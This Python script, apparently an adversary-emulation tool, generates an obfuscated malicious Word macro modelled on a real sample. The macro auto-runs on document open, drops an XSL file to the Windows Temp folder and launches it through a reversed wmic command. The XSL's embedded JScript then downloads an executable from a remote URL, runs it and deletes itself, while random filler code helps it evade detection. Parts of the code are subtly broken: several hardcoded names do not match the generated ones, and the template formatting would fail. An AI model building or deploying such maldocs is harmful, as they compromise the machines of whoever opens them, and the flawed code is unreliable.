import string
import random
import os

vba_variables = dict()

english_wordlist_path = os.path.join('\\'.join(__file__.split("/")[0:-3]), "internals", "words.txt")

with open(english_wordlist_path, 'r') as r:
    words = set(r.readlines())

used_variable_names = []

def generate_variable_name():
    first_character = "a"
    number_of_additional_characters = random.randint(4, 8)
    additional_character_options = list(string.ascii_letters)
    for d in string.digits:
        additional_character_options.append(d)

    var_to_return = first_character

    var_length_counter = 0

    while var_length_counter < number_of_additional_characters:
        var_to_return = str(var_to_return + random.choice(additional_character_options))
        var_length_counter = var_length_counter + 1

    return var_to_return

def get_new_variable_name():
    while True:
        candidate = generate_variable_name()
        if candidate not in used_variable_names:
            used_variable_names.append(candidate)
            return candidate

def get_new_unused_variable_and_definition():
    this_var = get_new_variable_name()

    this_choice = random.randint(1, 4)

    if this_choice == 1:  # bool statement
        return "Dim {} As {}\r\n{} = {}\r\n".format(
            this_var,
            "Boolean",
            this_var,
            random.choice(["True", "False"])
        )
    elif this_choice == 2:  # int statement
        return "Dim {} As {}\r\n{} = {}\r\n".format(
            this_var,
            "Integer",
            this_var,
            str(random.randint(-32000, 32000))
        )
    elif this_choice == 3:  # int statement
        return "Dim {} As {}\r\n{} = {}\r\n".format(
            this_var,
            "Long",
            this_var,
            str(random.randint(-32000, 32000))
        )
    elif this_choice == 4:  # int statement
        return "Dim {} As {}\r\n{} = \"{}\"\r\n".format(
            this_var,
            "String",
            this_var,
            get_new_variable_name()
        )

def get_new_comment():
    this_comment_word_count = random.randint(0, 5)
    this_comment = "'"
    comment_counter = 0
    while comment_counter < this_comment_word_count:
        trying = 1
        while trying == 1:
            wordattempt = str((random.sample(words, k=1)[0].rstrip("\n")))
            if wordattempt.isalpha():
                if comment_counter == 0:
                    wordattempt = wordattempt.title()
                this_comment = this_comment + " " + wordattempt
                trying = 0
        comment_counter = comment_counter + 1
    this_comment = this_comment + "\r\n"
    return this_comment

def get_filler(min, max):
    vba_to_return = ""
    for c in range(1, random.randint(min, max)):
        vba_to_return = vba_to_return + get_new_unused_variable_and_definition()
        if random.randint(1, 7) < 7:  # 6 of 7 times, insert a comment after
            vba_to_return = vba_to_return + get_new_comment()
        if random.randint(1, 5) == 1:  # 1  of 5 times, insert a new line
            vba_to_return = vba_to_return + "\r\n"
    return vba_to_return

def get_var_type():
    this_choice = random.randint(1, 4)
    if this_choice == 1:
        return "Boolean"
    elif this_choice == 2:
        return "Integer"
    elif this_choice == 3:
        return "Long"
    elif this_choice == 4:
        return "String"

#  ThisDocument
mod_1_name = "ThisDocument"

mod_1 = ""
mod_1 = mod_1 + "Sub Document_Open()\r\n"
mod_1 = mod_1 + get_filler(8, 11)
mod_1 = mod_1 + "main\r\nEnd Sub"

#  Module 2 - this module contains no functional code
mod_2_name = get_new_variable_name()

mod_2 = ""

# in sample looks like:
# Function aoYbuI(aX2A6F9V As Long) As String
mod_2 = mod_2 + "Function {}({} As {}) As {}\r\n".format(
    get_new_variable_name(),
    get_new_variable_name(),
    get_var_type(),
    get_var_type()
)

mod_2 = mod_2 + get_filler(10, 12)
mod_2 = mod_2 + "End Function"

# Module 3 - contains the CreateTextFile

mod_3_name = get_new_variable_name()

mod_3 = ""
mod_3 = mod_3 + "Function {}({} As {}) As {}\r\n".format(
    get_new_variable_name(),
    get_new_variable_name(),
    get_var_type(),
    get_var_type()
)

mod_3 = mod_3 + get_filler(10, 12)
mod_3 = mod_3 + "End Function\r\n"

# real code time
# code from sample:
'''
Public Sub adWspA8(aSVp8zOe As String, aH6MX As String)
Dim ajT74 As Object
Set ajT74 = CreateObject("Scripting.FileSystemObject")
Dim amxgqjco As Object
Set amxgqjco = ajT74.CreateTextFile(aSVp8zOe, True, True)
amxgqjco.Write aH6MX
amxgqjco.Close
'''

vba_variables['DropFileFunctionName'] = get_new_variable_name()
vba_variables['DropFileFunction_arg1'] = get_new_variable_name()
vba_variables['DropFileFunction_arg2'] = get_new_variable_name()
vba_variables['DropFileFunction_FileSystemObject'] = get_new_variable_name()
vba_variables['DropFileFunction_CreateTextFileObject'] = get_new_variable_name()

mod_3 = mod_3 + '''Public Sub {}({} As String, {} As String)
Dim {} As Object
Set {} = CreateObject("Scripting.FileSystemObject")
Dim {} As Object
Set {} = ajT74.CreateTextFile({}, True, True)
{}.Write {}
{}.Close\r\n'''.format(
    vba_variables['DropFileFunctionName'],
    vba_variables['DropFileFunction_arg1'],
    vba_variables['DropFileFunction_arg2'],
    vba_variables['DropFileFunction_FileSystemObject'],
    vba_variables['DropFileFunction_FileSystemObject'],
    vba_variables['DropFileFunction_CreateTextFileObject'],
    vba_variables['DropFileFunction_CreateTextFileObject'],
    vba_variables['DropFileFunction_arg1'],
    vba_variables['DropFileFunction_CreateTextFileObject'],
    vba_variables['DropFileFunction_arg2'],
    vba_variables['DropFileFunction_CreateTextFileObject']
)

mod_3 = mod_3 + get_filler(10, 12)
mod_3 = mod_3 + "End Sub"

#  Module 4 - contains main()

mod_4_name = get_new_variable_name()
mod_4 = ""

mod_4 = mod_4 + "Sub main()\r\n"
mod_4 = mod_4 + get_filler(16, 20)

vba_variables["form_object"] = get_new_variable_name()
mod_4 = mod_4 + "Dim {} As Object\r\n".format(
    vba_variables["form_object"]
)

mod_4 = mod_4 + get_filler(2, 4)

mod_5_name = get_new_variable_name()  # defining this earlier than normal because the modules reference each other

mod_4 = mod_4 + "Set {} = New {}\r\n".format(
    vba_variables["form_object"],
    mod_5_name
)

mod_4 = mod_4 + get_filler(3, 5)

vba_variables["xsl_payload_text"] = get_new_variable_name()

mod_4 = mod_4 + "Dim {} As String\r\n".format(
    vba_variables["xsl_payload_text"]
)

mod_4 = mod_4 + get_filler(3, 5)

vba_variables["xsl_path"] = get_new_variable_name()

mod_4 = mod_4 + "Dim {} As String\r\n".format(
    vba_variables["xsl_path"]
)

mod_4 = mod_4 + get_filler(2, 4)

vba_variables["form_click_sub"] = get_new_variable_name()

mod_4 = mod_4 + "{} = {}.{}.Text\r\n".format(
    vba_variables["xsl_payload_text"],
    vba_variables["form_object"],
    vba_variables["form_click_sub"]
)

vba_variables["xsl_file_name"] = get_new_variable_name()

mod_4 = mod_4 + "{} = \"{}\"\r\n".format(
    vba_variables["xsl_path"],
    "C:\\\\Windows\\\\Temp\\\\" + vba_variables["xsl_file_name"] + ".xsl"
)

mod_4 = mod_4 + get_filler(3, 5)

vba_variables["quote_chr"] = get_new_variable_name()

mod_4 = mod_4 + "{} = Chr(34)\r\n".format(
    vba_variables["quote_chr"]
)

mod_4 = mod_4 + get_filler(1, 2)

mod_4 = mod_4 + "Call {}({}, {})\r\n".format(
    vba_variables['DropFileFunctionName'],
    vba_variables['DropFileFunction_arg1'],
    vba_variables['DropFileFunction_arg2']
)

mod_4 = mod_4 + get_filler(13, 17)

vba_variables['wmic_rev_string'] = get_new_variable_name()

mod_4 = mod_4 + "{} = StrReverse(\":tamrof/ teg so cimw\")\r\n".format(
    vba_variables['wmic_rev_string']
)

mod_4 = mod_4 + "Shell {} & {} & {} & {}, 0\r\n".format(
    vba_variables['wmic_rev_string'],
    vba_variables["quote_chr"],
    vba_variables["xsl_path"],
    vba_variables["quote_chr"]
)

mod_4 = mod_4 + get_filler(8, 10)

mod_4 = mod_4 + "End Sub\r\n"

# Module 5 - this is the form
# mod_5_name is defined above, since it's referenced earlier

mod_5 = ""

mod_5 = mod_5 + "Private Sub {}_Change()\r\n".format(
    vba_variables["form_click_sub"]
)

mod_5 = mod_5 + "\r\nEnd Sub\r\n\r\n"

mod_5 = mod_5 + "Private Sub UserForm_Initialize()\r\n"
mod_5 = mod_5 + get_filler(3, 5)
mod_5 = mod_5 + "End Sub\r\n"
mod_5 = mod_5 + "Public Sub test()\r\n\r\n"
mod_5 = mod_5 + get_filler(2, 4)
mod_5 = mod_5 + "End Sub\r\n"

xsl_url_var = get_new_variable_name()
xsl_url = "https://the.earth.li/~sgtatham/putty/latest/w32/putty.exe"
xsl_shell_obj_var = get_new_variable_name()
xsl_filesystem_obj_var = get_new_variable_name()

xsl_template = '''<?xml version='1.0'?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:user="http://mycompany.com/mynamespace">
	<msxsl:script language="JScript" implements-prefix="user">
	<![CDATA[

		// url
		var {} = "{}";

		var {} = new ActiveXObject("wscript.shell");
		var {} = new ActiveXObject("scripting.filesystemobject");

		function axas5v9(a5OhCF)
		{
			var a1YiG5DuR = [
							"open",
							"send",
							"type",
							"write",
							"position",
							"savetofile",
							"close",
							"run"
						];

			return(a1YiG5DuR[a5OhCF]);
		}
	]]>
	</msxsl:script>
	<msxsl:script language="JScript" implements-prefix="user">
	<![CDATA[
		function aawg1(a5OhCF)
		{
			var a1vFwV = new ActiveXObject("msxml2.xmlhttp");

			a1vFwV.open("GET", azlW9BJ7, 0);
			a1vFwV.send();

			if(a1vFwV.status === 200 && a1vFwV.readystate === 4)
			{
				var akVXpGwht = new ActiveXObject("adodb.stream");
				akVXpGwht.open();
				akVXpGwht.type = 1;
				akVXpGwht.write(a1vFwV.responsebody);
				akVXpGwht.position = 0;
				akVXpGwht[axas5v9(5)](a5OhCF, 2);
				akVXpGwht.close();

				a9ArS.run(a5OhCF);

				// Self delete
				aWhiR.deletefile("C:\\\\Windows\\\\Temp\\\\aXwZvnt48.xsl");
			}
		}


	]]>
	</msxsl:script>
<xsl:template match="/">
<xsl:value-of select="user:aawg1('c:\\\\windows\\\\temp\\\\awMiOFl.exe')"/>
</xsl:template>
</xsl:stylesheet>'''.format(
    xsl_url_var,
    xsl_url,
    xsl_shell_obj_var,
    xsl_filesystem_obj_var
)

if __name__ == "__main__":
    print("\r\nModule 1\r\n")
    print("Name of module: " + mod_1_name + "\r\n")
    print("-----")
    print(mod_1)
    print("-----")
    print("\r\nModule 2\r\n")
    print("Name of module: " + mod_2_name + "\r\n")
    print("-----")
    print(mod_2)
    print("-----")
    print("\r\nModule 3\r\n")
    print("Name of module: " + mod_3_name + "\r\n")
    print("-----")
    print(mod_3)
    print("-----")
    print("\r\nModule 4\r\n")
    print("Name of module: " + mod_4_name + "\r\n")
    print("-----")
    print(mod_4)
    print("-----")

